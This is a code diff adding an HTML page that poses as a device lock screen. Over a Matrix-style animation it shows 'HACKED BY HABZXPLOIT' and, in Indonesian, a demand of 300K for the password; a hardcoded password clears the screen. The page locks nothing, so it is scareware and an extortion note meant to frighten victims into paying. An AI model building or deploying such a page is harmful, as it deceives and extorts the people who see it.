@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Locked - HABZXPLOIT</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: black;
+      color: #00ff00;
+      font-family: monospace;
+      height: 100%;
+    }
+    #matrixCanvas {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 1;
+    }
+    #lockScreen {
+      position: fixed;
+      z-index: 2;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: url('https://i.ibb.co/zNwZ2pv/anonymous-habzx.jpg') no-repeat center center;
+      background-size: cover;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      backdrop-filter: blur(2px);
+      text-align: center;
+    }
+    #lockScreen h1 {
+      font-size: 2em;
+      color: red;
+      text-shadow: 0 0 10px red;
+    }
+    input {
+      padding: 10px;
+      margin-top: 20px;
+      font-size: 16px;
+      background: black;
+      border: 2px solid #00ff00;
+      color: #00ff00;
+    }
+    button {
+      margin-top: 10px;
+      padding: 10px;
+      background: #00ff00;
+      color: black;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<canvas id="matrixCanvas"></canvas>
+
+<div id="lockScreen">
+  <h1>Perangkat Telah Dikunci<br>HACKED BY HABZXPLOIT
+  JIKA INGIN password NYA TEBUS 300K</h1>
+  <input type="password" id="pw" placeholder="Masukkan Password">
+  <button onclick="unlock()">UNLOCK</button>
+  <div id="message"></div>
+</div>
+
+<script>
+  const correctPassword = "HABZXPLOIT";
+
+  function unlock() {
+    const pw = document.getElementById("pw").value;
+    if (pw === correctPassword) {
+      document.getElementById("lockScreen").innerHTML = "<h1 style='color:lime;'>Access Granted! 🔓</h1>";
+    } else {
+      document.getElementById("message").innerText = "Password Salah!";
+    }
+  }
+
+  // Matrix Effect
+  const canvas = document.getElementById("matrixCanvas");
+  const ctx = canvas.getContext("2d");
+  canvas.height = window.innerHeight;
+  canvas.width = window.innerWidth;
+
+  const letters = "アカサタナハマヤラワ0123456789";
+  const fontSize = 16;
+  const columns = canvas.width / fontSize;
+  const drops = Array.from({ length: columns }, () => 1);
+
+  function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    ctx.fillStyle = "#0F0";
+    ctx.font = fontSize + "px monospace";
+
+    for (let i = 0; i < drops.length; i++) {
+      const text = letters[Math.floor(Math.random() * letters.length)];
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+      drops[i]++;
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+        drops[i] = 0;
+      }
+    }
+  }
+
+  setInterval(drawMatrix, 35);
+</script>
+
+</body>
+  </html>
